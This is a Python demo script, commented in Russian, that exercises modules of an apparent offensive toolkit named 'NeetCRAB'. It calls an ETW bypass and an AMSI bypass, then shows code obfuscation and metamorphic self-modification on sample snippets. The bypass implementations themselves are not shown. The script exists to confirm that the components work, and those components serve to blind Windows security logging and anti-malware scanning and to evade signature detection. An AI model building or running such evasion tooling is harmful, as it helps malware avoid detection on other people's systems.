#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Демонстрация работы модулей NeetCRAB.
Запустите, чтобы убедиться, что всё работает.
"""

import sys
import os

# Добавляем родительскую папку в путь, чтобы найти модули
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from etw_bypass import ETWBypass
from amsi_bypass import AMSIBypass
from obfuscator import obfuscate_code
from code_self_modify import CodeMutator


def demo_etw():
    print("\n[ETW Bypass]")
    bypass = ETWBypass()
    if bypass.bypass_all():
        print("  [+] ETW обойдён")
    else:
        print("  [-] Не удалось (возможно, не админ)")


def demo_amsi():
    print("\n[AMSI Bypass]")
    bypass = AMSIBypass()
    if bypass.bypass_all():
        print("  [+] AMSI обойдён")
    else:
        print("  [-] Не удалось")


def demo_obfuscator():
    print("\n[Obfuscator]")
    original = """
def secret_func():
    password = "admin123"
    print("Password is", password)
secret_func()
"""
    config = {
        'obfuscation_level': 'medium',
        'obfuscate_strings': True,
        'rename_variables': True,
        'add_junk_code': False,
        'anti_debug': False
    }
    obf = obfuscate_code(original, config)
    print(f"  Оригинал: {len(original)} байт")
    print(f"  Обфусцировано: {len(obf)} байт")
    print("  Первые 200 символов:")
    print("   ", obf[:200].replace('\n', '\n   '))


def demo_self_modify():
    print("\n[Code Self-Modify]")
    original = "a = 123\nprint('value:', a)"
    mutator = CodeMutator()
    mutated = mutator.apply_metamorphism(original)
    print(f"  Оригинал: {len(original)} байт")
    print(f"  Мутировано: {len(mutated)} байт")
    print("  Результат (первые 300 символов):")
    print("   ", mutated[:300].replace('\n', '\n   '))


if __name__ == '__main__':
    print("=" * 50)
    print("NeetCRAB Modules Demo")
    print("=" * 50)
    demo_etw()
    demo_amsi()
    demo_obfuscator()
    demo_self_modify()
    print("\n[Готово]")
